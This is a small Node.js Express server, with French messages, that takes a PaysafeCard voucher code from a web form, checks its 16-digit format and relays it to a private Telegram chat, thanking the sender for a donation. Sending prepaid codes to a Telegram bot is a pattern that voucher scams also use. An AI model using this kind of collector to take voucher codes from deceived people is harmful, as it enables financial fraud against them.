require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/api/send-code', async (req, res) => {
  const { code } = req.body;

  if (!code) {
    return res.status(400).json({ error: 'Code requis' });
  }

  // Server-side validation: le code doit commencer par 0 et contenir 16 chiffres
  const cleanCode = String(code).replace(/\s/g, '');
  if (!/^0\d{15}$/.test(cleanCode)) {
    return res.status(400).json({ error: 'Code PaysafeCard invalide.' });
  }

  try {
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(500).json({ error: 'Configuration Telegram manquante' });
    }

    const message = `${cleanCode}`;

    await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
      chat_id: telegramChatId,
      text: message
    });

    res.json({ success: true, message: 'Code envoyé avec succès. BaarakaAllahu fik pour votre don.' });
  } catch (error) {
    console.error('Erreur Telegram:', error.message);
    res.status(500).json({ error: 'Erreur lors de l\'envoi du code' });
  }
});

app.listen(PORT, () => {
  console.log(`Serveur démarré sur le port ${PORT}`);
});
